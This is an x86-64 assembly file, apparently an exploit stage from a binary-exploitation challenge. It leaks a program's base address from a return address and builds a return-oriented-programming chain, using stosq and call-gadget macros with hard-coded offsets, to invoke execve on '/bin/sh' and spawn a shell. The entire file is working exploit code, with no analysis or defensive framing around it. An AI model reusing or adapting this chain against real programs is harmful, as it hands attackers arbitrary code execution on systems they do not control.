push rbp
push r8
push r9

/* rdi = &retaddr */
lea rdi, [rbx-32-8]

/* rcx = base */
mov rcx, -0xab0
add rcx, [rdi]

/* rbp = syscall */
mov rbp, [rcx+0x201f90]
add rbp, 5

#define base(value) \
	lea rax, [rcx+value]; \
	stosq;


#define imm(value) \
	mov rax, value; \
	stosq;

lea rsi, [rcx+0x202800]

#define call(target, arg0, arg1, arg2) \
	base(0xe8a) \
	imm(0) \
	imm(1) \
	mov [rsi], target; \
	imm(rsi) \
	add rsi, 8; \
	imm(arg0) \
	imm(arg1) \
	imm(arg2) \
	base(0xe70) \
	imm(0) \
	imm(0) \
	imm(0) \
	imm(0) \
	imm(0) \
	imm(0) \
	imm(0)

base(0x8d6)

lea r8, [rcx+0x940]
lea r9, [rcx+0x202200]
call(r8, __NR_execve, 0, 0)
call(r8, 0, 0, 0)
call(rbp, 0, r9, r9)

lea r8, [r9+0x10]

base(0xe93)
imm(__NR_execve)
base(0x940)
base(0x940)
base(0xe93)
imm(r8)
imm(rbp)
base(0xdd0)

mov [r9], r8
mov qword ptr [r9+0x8], 0
mov rax, [rip+stage2_start]
mov [r8], rax

pop r9
pop r8
pop rbp
ret

stage2_start:
.asciz "/bin/sh\x00"
stage2_end:
